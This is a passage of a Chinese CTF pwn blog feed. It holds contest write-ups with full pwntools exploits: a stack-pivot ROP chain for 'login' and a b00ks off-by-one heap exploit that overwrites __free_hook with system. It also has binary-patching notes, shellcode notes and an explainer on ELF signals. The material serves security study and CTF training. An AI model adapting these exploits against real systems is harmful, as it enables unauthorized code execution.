    <id>https://ixout.github.io/posts/4654/</id>
    <published>2023-06-25T04:47:56.000Z</published>
    <updated>2023-07-01T11:47:58.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-25_225313.png" alt=""></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>栈溢出,buf的大小是0xf0</p><p>但是读入0x100会造成栈溢出</p><p>patch输入大小为0xf1即可,不晓得为什么0xf0不行</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>防御只开了nx和got表保护</p><p>溢出有限</p><p>必然要栈迁移</p><p>然后泄露地址,并再次返回到read数据段处</p><p>然后因为要防止栈越界</p><p>要通过read再次调整栈到高处</p><p>最后getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">lr=<span class="number">0x40136E</span></span><br><span class="line">r=<span class="number">0x40101a</span></span><br><span class="line">bss=<span class="number">0x404060</span></span><br><span class="line">bssplus=bss+<span class="number">0xa00</span></span><br><span class="line">pop_rdi=<span class="number">0x4013d3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4013d1</span></span><br><span class="line">readagain=<span class="number">0x401353</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;175.20.28.11&#x27;,9999)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(bss+<span class="number">0x48</span>)+p64(lr))<span class="comment">#栈迁移</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(bss+<span class="number">0x38</span>)<span class="comment">#第二次栈迁移准备,因为可控地区只有这里,只能重新回到这,+0x38防止越界</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])<span class="comment">#泄露地址</span></span><br><span class="line">payload+=p64(r)+p64(readagain)<span class="comment">#第二次栈迁移</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets_addr=libc_base+libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(bssplus)+p64(pop_rdi)<span class="comment">#第三次栈迁移准备</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bssplus)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#rdx几乎不会改变,保持之前的0x90,故不用布置     #并read往第三次栈迁移目标方向布置栈</span></span><br><span class="line">payload+=p64(lr)<span class="comment">#第三次栈迁移</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(p64(bssplus)+p64(pop_rdi)+p64(binsh)+p64(r)+p64(system_addr))<span class="comment">#getshell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>主要就是栈迁移,不过为了防止栈越界,不得不做更多的布置</p><h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><p>gdb和pause组合有时会产生各种各样的牛马问题,二者单独存在问题不大,但一组合就需要谨慎区别了,确认exp无问题就去掉二者,不然exp对了也无法getshell</p><p>又发现,就算二者组合,只要没有在gdb中操控程序则不会出现问题</p><h1 id="houmt"><a href="#houmt" class="headerlink" title="houmt"></a>houmt</h1><h2 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h2><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_194639.png" alt=""></p><p>存在uaf漏洞</p><p>添加置0功能,但显然不能在原来的位置,否则会覆盖其他代码</p><p>选择在eh.frame节上增加功能</p><p>首先修改权限,rwx</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_201752.png" alt=""></p><p>之后再eh.frame上找一个合适的位置打上补丁</p><p>同样先调用free,之后再重新获得偏移并寻址置零</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_201911.png" alt=""></p><p>patch成功</p><h2 id="拾遗-1"><a href="#拾遗-1" class="headerlink" title="拾遗"></a>拾遗</h2><p>当要修改的长度大于原有长度时,就需要跳转到别处执行,执行后再返回到原处</p><p>一般选择eh.frame节或者.fini节</p><h1 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h1><h2 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h2><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_202925.png" alt=""></p><p>发现,依然存在uaf,free后只是将存储的chunk的大小置零,而并没有将指针置零</p><p>与上一题很像,但据师傅们所说,按照上一题的方法会存在异常</p><p>于是可以利用原语句中将size置零,去掉偏移即是指针置零</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_203321.png" alt=""></p><p>将偏移变为0,patch成功</p><h2 id="拾遗-2"><a href="#拾遗-2" class="headerlink" title="拾遗"></a>拾遗</h2><p>合理利用偏移有时候能达到意想不到的效果</p><h1 id="MaskNote"><a href="#MaskNote" class="headerlink" title="MaskNote"></a>MaskNote</h1><h2 id="patch-3"><a href="#patch-3" class="headerlink" title="patch"></a>patch</h2><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_203629.png" alt=""></p><p>连接字符串长度超过其原有长度</p><p>修改<br><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_204812.png" alt=""></p><p>patch成功</p><h1 id="总拾遗"><a href="#总拾遗" class="headerlink" title="总拾遗"></a>总拾遗</h1>]]></content>
    
    
    <summary type="html">记第一次参加的正式比赛</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="awdp" scheme="https://ixout.github.io/tags/awdp/"/>
    
    <category term="线下赛" scheme="https://ixout.github.io/tags/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    <category term="patch" scheme="https://ixout.github.io/tags/patch/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://ixout.github.io/posts/46563/"/>
    <id>https://ixout.github.io/posts/46563/</id>
    <published>2023-06-20T15:14:33.000Z</published>
    <updated>2023-06-20T15:15:59.477Z</updated>
    
    
    <summary type="html">正则表达式</summary>
    
    
    
    <category term="CS_learn" scheme="https://ixout.github.io/categories/CS-learn/"/>
    
    
    <category term="正则表达式" scheme="https://ixout.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>shellcode编写初识</title>
    <link href="https://ixout.github.io/posts/30663/"/>
    <id>https://ixout.github.io/posts/30663/</id>
    <published>2023-05-14T14:49:49.000Z</published>
    <updated>2023-07-16T15:03:51.103Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础汇编"><a href="#基础汇编" class="headerlink" title="基础汇编"></a>基础汇编</h1><h2 id="syscall-int-0x80"><a href="#syscall-int-0x80" class="headerlink" title="syscall(~int 0x80)"></a>syscall(~int 0x80)</h2><div class="table-container"><table><thead><tr><th>function</th><th>syscall number x86_32</th><th>syscall number x86_64</th></tr></thead><tbody><tr><td>read</td><td>3</td><td>0</td></tr><tr><td>write</td><td>4</td><td>1</td></tr><tr><td>open</td><td>5</td><td>2</td></tr><tr><td>execve</td><td>11</td><td>59</td></tr></tbody></table></div><h2 id="汇编长度判断"><a href="#汇编长度判断" class="headerlink" title="汇编长度判断"></a>汇编长度判断</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><h4 id="双寄存器"><a href="#双寄存器" class="headerlink" title="双寄存器"></a>双寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov r64,r64</td><td>3</td></tr><tr><td>mov e32,e32</td><td>2</td></tr><tr><td>mov 16,16</td><td>3</td></tr></tbody></table></div><h4 id="单寄存器"><a href="#单寄存器" class="headerlink" title="单寄存器"></a>单寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov  r64,int32</td><td>7</td></tr><tr><td>mov r64,int64</td><td>10</td></tr><tr><td>mov r64,[r64]/mov [r64],r64</td><td>3~4</td></tr><tr><td>mov r64,[r64+0x??]/mov [r64+0x??],r64</td><td>在上基础根据??判断增加</td></tr><tr><td>mov e32,int32</td><td>5</td></tr><tr><td>mov e32,[e32]/mov [e32],e32</td><td>2~3</td></tr><tr><td>mov e32,[e32+0x??]/mov [e32+0x??],e32</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><p><strong>在上基础根据??判断增加</strong>:增加规则,2个十六进制数及以下+1字节;3到8个十六进制数+4字节,再往上+8字节</p><h3 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push&amp;pop"></a>push&amp;pop</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>push int8</td><td>2</td></tr><tr><td>push int32/int64</td><td>5</td></tr><tr><td>push r64/e32</td><td>1</td></tr><tr><td>pop r64/e32</td><td>1</td></tr><tr><td>pop [r64]</td><td>2~3</td></tr><tr><td>pop [r64+0x??]</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><h3 id="and-amp-or-amp-xor"><a href="#and-amp-or-amp-xor" class="headerlink" title="and&amp;or&amp;xor"></a>and&amp;or&amp;xor</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>and/or r64,r64</td><td>3</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>4/6/10?</td></tr><tr><td>and/or e32,e32</td><td>2</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>3/6/10?</td></tr></tbody></table></div><h3 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>jmp r64</td><td>2</td></tr><tr><td>jmp $+0x??</td><td>视??决定,&gt;=2</td></tr></tbody></table></div><h1 id="shellcraft使用"><a href="#shellcraft使用" class="headerlink" title="shellcraft使用"></a>shellcraft使用</h1><p>pwntools自带的shell生成模块,生成的汇编代码能达到目的,但一般长度较大</p><p>shellcraft.sh()</p><p>shellcraft.read()</p><p>shellcraft.write()</p><p>shellcraft.open()</p><p> 寄存器记得加引号</p><h1 id="手搓"><a href="#手搓" class="headerlink" title="手搓"></a>手搓</h1><p>清零</p><p>syscall</p><p>int 0x80</p><p>参数布置</p><p>等等</p><h1 id="纯可见字符shellcode"><a href="#纯可见字符shellcode" class="headerlink" title="纯可见字符shellcode"></a>纯可见字符shellcode</h1>]]></content>
    
    
    <summary type="html">汇编</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>elf常见运行报错</title>
    <link href="https://ixout.github.io/posts/43614/"/>
    <id>https://ixout.github.io/posts/43614/</id>
    <published>2023-05-14T08:53:43.000Z</published>
    <updated>2023-07-20T14:24:48.299Z</updated>
    
    <content type="html"><![CDATA[<h1 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h1><p><strong>signal: 11</strong></p><p><strong>exit code: 139</strong></p><p><strong>信号名: SIGSEGV</strong></p><p>最常见的一类错误了</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>访问不存在的内存地址</strong></li><li><strong>访问系统保护的内存地址</strong></li><li><strong>对内存地址进行不符合该内存地址权限的操作</strong>,例如读不可读的地址,写不可写的地址,执行不可执行的地址</li><li><strong>内存对齐问题</strong>,经常会遇到类似这样的汇编命令<code>movaps xmmword ptr [r64 + 0x??], xmm0</code>,操作涉及到xmm寄存器,属于SIMD指令,其中movaps会检查[r64 + 0x??]地址<strong>是否16字节对齐</strong>,不对齐则异常,抛出段错误.</li></ol><h1 id="Bus-error"><a href="#Bus-error" class="headerlink" title="Bus error"></a>Bus error</h1><p><strong>signal: 7</strong></p><p><strong>exit code: 135</strong></p><p><strong>信号名: SIGBUS</strong></p><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><h3 id="文件映射访问异常"><a href="#文件映射访问异常" class="headerlink" title="文件映射访问异常"></a>文件映射访问异常</h3><p>这是 SIGBUS 在用户态最为常见最容易触发的情况，通常来说根本原因都是进程 mmap 了一个文件后，另外的进程把这个文件截断了，导致 mmap 出来的某些内存页超出文件的实际大小，访问那些超出的内存页就会触发 SIGBUS，具体来说有以下几种场景：</p><ol><li><p>进程 mmap 一个文件后，其它进程 truncate 该文件到更小。</p></li><li><p>动态库更新，直接 cp 覆盖。</p></li><li><p>可执行文件更新，直接 cp 覆盖。</p></li></ol><p>系统读取磁盘文件通常是按页映射到内存，出于效率考虑常常使用 copy on write 机制，所以文件映射之后，如果对应的文件 page 不存在了(truncated），也不见得会马上出问题，只有到访问时才会出错，因此有一定滞后期。</p><h3 id="访问不对齐的内存"><a href="#访问不对齐的内存" class="headerlink" title="访问不对齐的内存"></a>访问不对齐的内存</h3><p>X86 平台上访问不对齐的内存时，默认不会有问题，但用户可以手动设置 EFLAGS 把 CPU 设置为不允许非对齐的内存访问，此时如果出现不对齐的内存访问，SIGBUS 就会抛出。</p><h1 id="错误的系统调用"><a href="#错误的系统调用" class="headerlink" title="错误的系统调用"></a>错误的系统调用</h1><p><strong>signal: 31</strong></p><p><strong>exit code: 159</strong></p><p><strong>信号名: SIGSYS</strong></p><p><strong>常见在开启了seccomp的程序中,当进行了被限制的系统调用时,抛出该错误</strong></p><h1 id="定时器信号"><a href="#定时器信号" class="headerlink" title="定时器信号"></a>定时器信号</h1><p><strong>signal: 14</strong></p><p><strong>exit code: 1</strong>4</p><p><strong>信号名: SIGALRM</strong></p><p><strong>长时间未响应程序时抛出该信号</strong></p><h1 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h1><p><strong>signal: 6</strong></p><p><strong>exit code: 134</strong></p><p><strong>信号名: SIGABRT</strong></p><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>执行abort函数</strong></li><li>执行assert函数</li><li><strong>double free or corruption (!prev)</strong>,其实就是堆操作错误了,归根结底最后还是由<strong>abort函数触发</strong></li></ol><h1 id="信号表"><a href="#信号表" class="headerlink" title="信号表"></a>信号表</h1><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-05-14_165734.png" alt=""></p>]]></content>
    
    
    <summary type="html">经常遇见的报错</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="报错" scheme="https://ixout.github.io/tags/%E6%8A%A5%E9%94%99/"/>
    
  </entry>
  
  <entry>
    <title>堆实操学习笔记</title>
    <link href="https://ixout.github.io/posts/15815/"/>
    <id>https://ixout.github.io/posts/15815/</id>
    <published>2023-04-27T02:11:26.000Z</published>
    <updated>2023-07-21T09:31:26.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h2><p><strong>难度:★★</strong></p><p><strong>核心利用是off-by-one</strong></p><p>使得一个用于管理指针的chunk指向可写区域,进而达到任意写的目的</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">local_path = <span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">io = process(local_path)</span><br><span class="line"><span class="comment"># libc = io.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.binary = local_path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(option)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_author_name</span>(<span class="params">author_name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_sz, name, dscr_sz, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(idx):  <span class="comment">#print功能会打印所有book的信息,需要挑选</span></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        bookID = <span class="built_in">int</span>(io.recvline()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        name = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        dscr = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        author = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bookID, name, dscr, author</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">author_name</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    enter_author_name(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by one to leak addr of book1</span></span><br><span class="line">enter_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#使得在打印book1地址前不会停下</span></span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;64&#x27;</span>, <span class="string">b&#x27;book1&#x27;</span>, <span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#这个大小还有一些限制,这样的话刚刚好,否则可能会要填充一些padding</span></span><br><span class="line"></span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">book1_addr = unpack(author1[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak book1_addr:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;135168&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)<span class="comment">#mem指针指向&#x27;/bin/sh&#x27;指针,free时用到</span></span><br><span class="line"><span class="comment">#gdb.attach(io)  </span></span><br><span class="line"><span class="comment"># construct fake book1 to leak addr of book2</span></span><br><span class="line">payload1 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(book1_addr-<span class="number">0x30</span>) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#第二个pack是为了得到mmap地址</span></span><br><span class="line"><span class="comment">#第三个pack是为了使得des1指向的位置不变</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload1)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by null to point at fake book1</span></span><br><span class="line">change(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">mmap_addr = unpack(name1.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak mmap_addr:&quot;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"> </span><br><span class="line">libc_base = mmap_addr + <span class="number">0x22000</span> - <span class="number">0x10</span><span class="comment">#去头加偏移</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"> </span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload2 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(free_hook_addr) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#将des1指针替换为free_hook的地址,并修改其为system的地址</span></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload2)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, pack(system_addr))</span><br><span class="line"> </span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>与wiki和大多数博客的不同,我做了一些调整,这个我觉得是更合理的(基于ubuntu20原装环境)</p><p><strong>小记0x1-0x3</strong></p><h2 id="v-amp-n2020招新赛simpleheap"><a href="#v-amp-n2020招新赛simpleheap" class="headerlink" title="v&amp;n2020招新赛simpleheap"></a>v&amp;n2020招新赛simpleheap</h2><p><strong>难度:★★</strong></p><p>这题难度较上一题要明显高出一截</p><p>核心利用是off-by-one以及unsortedbin attack</p><p>程序的漏洞在于其edit函数存在off-by-one，以此来修改下一个chunk的size域</p><p>并利用unsortedbin的切割特性来泄露mainarena+88,来得到libc_base</p><p>再通过伪造一个fakechunk(可写hook)到fastbins链上,使得两次分配得到该chunk并覆写mallochook和reallochook</p><p>不直接覆盖mallochook为onegadget的原因是,四个onegadget的条件都不满足,故只能通过realloc函数来调整栈帧并调用reallochook为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 